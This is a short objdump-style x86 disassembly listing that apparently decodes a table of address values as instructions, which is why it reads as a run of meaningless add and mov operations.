  428e1f:	add    BYTE PTR [ecx+ecx*4+0x2],ch
  428e26:	add    BYTE PTR [eax],al
  428e28:	retf   0x289
  428e2b:	add    ah,bl
  428e2d:	mov    DWORD PTR [edx],eax
  428e2f:	add    dh,ch
  428e31:	mov    DWORD PTR [edx],eax
  428e33:	add    BYTE PTR [edx+ecx*4],al
  428e36:	add    al,BYTE PTR [eax]
  428e38:	push   ss
  428e39:	mov    al,BYTE PTR [edx]
  428e3b:	add    BYTE PTR [eax],ch
  428e3d:	mov    al,BYTE PTR [edx]
  428e3f:	add    BYTE PTR [eax],bh
  428e41:	mov    al,BYTE PTR [edx]
  428e43:	add    BYTE PTR [esi-0x76],dl
  428e46:	add    al,BYTE PTR [eax]
  428e48:	data16 mov al,BYTE PTR [edx]
  428e4b:	add    BYTE PTR [edx+ecx*4+0x2],dh
  428e4f:	add    BYTE PTR [edx+ecx*4-0x756dfffe],al
  428e56:	add    al,BYTE PTR [eax]
  428e58:	mov    ds:0xae00028a,al
  428e5d:	mov    al,BYTE PTR [edx]
  428e5f:	add    al,al
  428e61:	mov    al,BYTE PTR [edx]
  428e63:	add    dl,dl
  428e65:	mov    al,BYTE PTR [edx]
  428e67:	add    al,ch
  428e69:	mov    al,BYTE PTR [edx]
  428e6b:	add    dh,dh
  428e6d:	mov    al,BYTE PTR [edx]
  428e6f:	add    BYTE PTR [edx],al
  428e71:	mov    eax,DWORD PTR [edx]
  428e73:	add    BYTE PTR [ebx+ecx*4],bl
  428e76:	add    al,BYTE PTR [eax]
  428e78:	xor    al,0x8b
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	dec    esp
  428e7d:	mov    eax,DWORD PTR [edx]
  428e7f:	add    BYTE PTR [edx-0x75],bl
  428e82:	add    al,BYTE PTR [eax]
  428e84:	mov    ax,WORD PTR [edx]
  428e87:	add    BYTE PTR [eax-0x75],bh
  428e8a:	add    al,BYTE PTR [eax]
  428e8c:	add    BYTE PTR [eax],al
  428e8e:	add    BYTE PTR [eax],al
  428e90:	cwde   
  428e91:	mov    eax,DWORD PTR [edx]
  428e93:	add    BYTE PTR [edx-0x4ffffd75],ah
  428e99:	mov    eax,DWORD PTR [edx]
  428e9b:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],bh
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	fimul  DWORD PTR [ebx-0x7419fffe]
  428eaa:	add    al,BYTE PTR [eax]
  428eac:	lock mov eax,DWORD PTR [edx]
  428eaf:	add    BYTE PTR [edx],al
  428eb1:	mov    WORD PTR [edx],es
  428eb3:	add    BYTE PTR [eax],bl
  428eb5:	mov    WORD PTR [edx],es
  428eb7:	add    BYTE PTR [esi],ch
  428eb9:	mov    WORD PTR [edx],es
  428ebb:	add    BYTE PTR [esp+ecx*4+0x2],al
  428ebf:	add    BYTE PTR [esp+ecx*4+0x2],dl
  428ec3:	add    BYTE PTR [esp+ecx*4+0x2],ah
  428ec7:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428ecb:	add    BYTE PTR [edx-0x65fffd74],al
  428ed1:	mov    WORD PTR [edx],es
  428ed3:	add    BYTE PTR [esp+ecx*4-0x734ffffe],ah
  428eda:	add    al,BYTE PTR [eax]
  428edc:	mov    esi,0x28c
  428ee1:	add    BYTE PTR [eax],al
	...
